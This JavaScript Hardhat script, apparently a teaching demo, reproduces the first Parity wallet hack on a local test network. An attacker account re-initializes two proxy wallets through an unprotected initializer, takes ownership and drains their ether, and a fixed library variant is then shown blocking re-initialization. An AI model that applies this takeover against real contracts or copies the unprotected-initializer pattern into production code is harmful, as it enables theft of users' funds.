const { ethers } = require("hardhat");

async function main() {
  const [deployer, legitOwner, attacker] = await ethers.getSigners();

  console.log("=== Part 2: Parity Hack #1 (Unauthorized Initialization) ===");

  const Lib = await ethers.getContractFactory("WalletLibraryVulnerable", deployer);
  const lib = await Lib.deploy();
  await lib.waitForDeployment();

  const Proxy = await ethers.getContractFactory("WalletProxy", deployer);
  const wallet1 = await Proxy.deploy(await lib.getAddress());
  const wallet2 = await Proxy.deploy(await lib.getAddress());
  const wallet3 = await Proxy.deploy(await lib.getAddress());
  await Promise.all([wallet1.waitForDeployment(), wallet2.waitForDeployment(), wallet3.waitForDeployment()]);

  const libraryAbi = Lib.interface.fragments;
  const w1Legit = new ethers.Contract(await wallet1.getAddress(), libraryAbi, legitOwner);
  const w2Attacker = new ethers.Contract(await wallet2.getAddress(), libraryAbi, attacker);
  const w3Attacker = new ethers.Contract(await wallet3.getAddress(), libraryAbi, attacker);

  await (await w1Legit.initWallet(await legitOwner.getAddress())).wait();
  console.log("Wallet1 initialized by legit owner.");

  await (await w2Attacker.initWallet(await attacker.getAddress())).wait();
  await (await w3Attacker.initWallet(await attacker.getAddress())).wait();
  console.log("Attacker re/initialized Wallet2 and Wallet3 via delegatecall.");

  await legitOwner.sendTransaction({ to: await wallet2.getAddress(), value: ethers.parseEther("3") });
  await legitOwner.sendTransaction({ to: await wallet3.getAddress(), value: ethers.parseEther("2") });

  const wallet2Before = await ethers.provider.getBalance(await wallet2.getAddress());
  const wallet3Before = await ethers.provider.getBalance(await wallet3.getAddress());
  await (await w2Attacker.execute(await attacker.getAddress(), ethers.parseEther("3"))).wait();
  await (await w3Attacker.execute(await attacker.getAddress(), ethers.parseEther("2"))).wait();
  const wallet2After = await ethers.provider.getBalance(await wallet2.getAddress());
  const wallet3After = await ethers.provider.getBalance(await wallet3.getAddress());

  console.log("Attacker drained both hijacked wallets.");
  console.log("Wallet2 delta:", ethers.formatEther(wallet2After - wallet2Before), "ETH");
  console.log("Wallet3 delta:", ethers.formatEther(wallet3After - wallet3Before), "ETH");

  console.log("\n=== Fixed variant: block re-initialization ===");
  const FixedLib = await ethers.getContractFactory("WalletLibraryFixed", deployer);
  const fixedLib = await FixedLib.deploy();
  await fixedLib.waitForDeployment();
  const fixedWallet = await Proxy.deploy(await fixedLib.getAddress());
  await fixedWallet.waitForDeployment();

  const fixedAbi = FixedLib.interface.fragments;
  const fixedAsLegit = new ethers.Contract(await fixedWallet.getAddress(), fixedAbi, legitOwner);
  const fixedAsAttacker = new ethers.Contract(await fixedWallet.getAddress(), fixedAbi, attacker);

  await (await fixedAsLegit.initWallet(await legitOwner.getAddress())).wait();
  try {
    await (await fixedAsAttacker.initWallet(await attacker.getAddress())).wait();
    console.log("Unexpected: attacker re-initialized fixed wallet");
  } catch {
    console.log("Fixed contract prevented re-initialization as expected.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
